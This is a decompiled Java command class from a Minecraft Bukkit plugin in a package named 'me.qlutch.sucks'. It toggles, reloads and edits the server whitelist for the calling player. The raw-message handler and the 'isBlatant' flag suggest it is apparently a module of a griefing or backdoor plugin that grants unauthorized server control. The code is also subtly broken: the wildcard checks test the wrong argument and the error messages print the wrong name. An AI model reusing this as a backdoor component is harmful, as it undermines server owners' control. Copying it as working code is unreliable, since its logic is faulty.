/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class WhitelistCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("whitelist <on | off | reload | add | remove>"));
        } else if (args[1].equalsIgnoreCase("on")) {
            Bukkit.setWhitelist((boolean)true);
            p2.sendMessage(Settings.PREFIX("Whitelist has turned on!"));
        } else if (args[1].equalsIgnoreCase("off")) {
            Bukkit.setWhitelist((boolean)false);
            p2.sendMessage(Settings.PREFIX("Whitelist has been turned off!"));
        } else if (args[1].equalsIgnoreCase("reload")) {
            Bukkit.reloadWhitelist();
            p2.sendMessage(Settings.PREFIX("Whitelist has been reloaded!"));
        } else if (args[1].equalsIgnoreCase("add")) {
            if (args.length <= 2) {
                p2.setWhitelisted(true);
                p2.sendMessage(Settings.PREFIX("You have been added to the whitelist!"));
            } else if (args[1].equals("*")) {
                for (Player a2 : Bukkit.getOnlinePlayers()) {
                    a2.setWhitelisted(true);
                    p2.sendMessage(Settings.PREFIX("All online players are now whitelisted"));
                }
            } else {
                Player target = Bukkit.getServer().getPlayer(args[2]);
                if (target == null) {
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
                } else {
                    target.setWhitelisted(true);
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " is now whitelisted!"));
                }
            }
        } else if (args[1].equalsIgnoreCase("remove")) {
            if (args.length <= 2) {
                p2.setWhitelisted(false);
                p2.sendMessage(Settings.PREFIX("You have been removed from the whitelist!"));
            } else if (args[1].equals("*")) {
                for (Player a3 : Bukkit.getOnlinePlayers()) {
                    a3.setWhitelisted(false);
                    p2.sendMessage(Settings.PREFIX("All online players have been removed from the whitelist"));
                }
            } else {
                Player target = Bukkit.getServer().getPlayer(args[2]);
                if (target == null) {
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
                } else {
                    target.setWhitelisted(false);
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " is no longer whitelisted!"));
                }
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

